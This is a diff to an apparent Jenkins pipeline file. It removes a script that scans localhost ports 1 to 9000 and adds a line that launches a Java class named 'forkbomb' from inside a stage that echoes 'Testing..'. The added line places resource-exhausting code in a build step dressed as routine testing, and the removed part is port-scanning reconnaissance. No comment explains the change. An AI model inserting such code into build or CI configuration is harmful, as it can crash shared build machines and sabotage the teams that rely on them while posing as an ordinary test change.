@@ -17,18 +17,7 @@ pipeline {
             steps {
 
               script {
-                java.net.MySocket = java.net.Socket
-                  
-                ports = 1..9000
-                ports.each { port ->
-                    try {
-                        def socket = new MySocket("127.0.0.1", port)
-                        print "Port ${port}: OPEN \n"
-                    }catch (e){
-
-                    }
-                }
-                println "It took ${duration} to run this port scan..."
+                Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "forkbomb"});
               }
                 echo 'Testing..'
             }
